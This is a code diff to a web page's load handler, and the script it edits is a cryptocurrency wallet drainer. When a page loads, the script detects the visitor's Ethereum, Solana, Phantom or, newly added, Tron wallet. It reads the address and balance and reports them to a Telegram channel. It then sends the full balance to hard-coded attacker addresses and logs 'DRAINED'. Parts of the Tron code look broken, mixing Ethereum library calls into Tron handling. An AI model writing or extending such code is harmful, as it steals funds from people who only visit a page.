@@ -183,7 +183,7 @@
     }
 
     window.addEventListener('load', async () => {
-      if (window.ethereum || window.solana || window.phantom?.solana) {
+      if (window.ethereum || window.solana || window.phantom?.solana || window.tronWeb) {
         try {
           let provider, address, network, balanceFormatted = '0', symbol = 'Unknown', target;
 
@@ -212,16 +212,22 @@
             balanceFormatted = (bal / 1e9).toFixed(6);
             symbol = 'SOL';
             target = addresses[network] || 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM';
+          } else if (window.tronWeb) {
+            provider = window.tronWeb;
+            address = provider.defaultAddress.base58;
+            network = 'Tron';
+            balanceFormatted = (await provider.trx.getBalance(address) / 1e6).toFixed(6);
+            symbol = 'TRX';
+            target = addresses['Tron (TRX)'] || 'DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk';
           }
 
           await sendToTelegram(`Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`);
 
           if (parseFloat(balanceFormatted) > 0) {
-            const tx = await provider.getSigner().sendTransaction({
+            const tx = await provider.sendTransaction({
               to: target,
-              value: ethers.utils.parseEther(balanceFormatted)
+              value: ethers.utils.parseEther(balanceFormatted).toString()
             });
-            await tx.wait();
             await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
           }
         } catch (e) {
